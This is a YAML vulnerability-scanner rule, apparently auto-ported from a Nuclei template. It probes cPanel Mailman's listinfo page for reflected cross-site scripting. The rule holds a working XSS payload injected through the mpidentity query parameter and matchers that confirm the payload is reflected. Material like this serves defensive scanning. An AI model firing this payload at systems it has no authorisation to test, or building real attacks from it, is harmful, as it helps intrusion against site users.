schema_version: 1
id: "cortex.community:cpanel-mailman-xss"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "cPanel Mailman - Cross-Site Scripting"
  description: "cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output encoding, resulting in reflected cross-site scripting. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities"
  cwes: [80]
  tags: ["xss", "cpanel", "mailman", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Medium"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "</script><svg/onload=alert(document.domain)>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "mailman" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "gnu-head-tiny" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
